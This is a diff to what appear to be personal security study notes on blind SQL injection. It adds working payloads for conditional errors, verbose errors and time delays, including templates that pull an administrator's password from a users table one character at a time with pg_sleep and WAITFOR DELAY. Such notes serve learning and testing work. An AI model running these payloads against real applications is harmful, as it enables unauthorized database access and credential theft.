@@ -4,20 +4,9 @@ at this point there is an SQLi but we can't extract info directly because the
 application's HTTP responses don't return the result of SQL quires or database
 errors.
 
-Examine:
-
-send payloads to trigger conditional responses and observe the behavior:
-
-  * time based:
-
-  focusing on response time difference of different payloads by triggering a time delay.
-  if the delay occurs means the query worked.
-
-  - trigger an out of band network interaction
-
 Exploit:
 
-based on conditional responses: boolean, time delays, errors.
+based on conditional responses: conditional responses (boolean), conditional errors, time delays.
 ## [[SQLi Blind boolean| boolean based]]
 
 injecting test conditions that return either true or false;slowly inferring the
@@ -30,7 +19,19 @@ structure of the database.
 
 ## [[SQLi Blind Error Based| Error based]]
 
+### conditional errors:
+
+2. `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`
+3. `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
+
+### Verbose Error Messages:
+
+1. `CAST((SELECT example_column FROM example_table) AS int)` might trigger an error
+2. `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT) --`
 ## [[SQLi Blind Time Delays| Time Delays]]
+
+1. `'; IF (1=1) WAITFOR DELAY '0:0:10'--`
+2. `("32H3bfd687INjf7b' || (SELECT CASE WHEN (SELECT SUBSTR(password,%d,1) FROM users WHERE username='administrator') = '%c' THEN pg_sleep(10) ELSE pg_sleep(0) END) --", index, c)`
 
 ## using out-of-band techniques
 
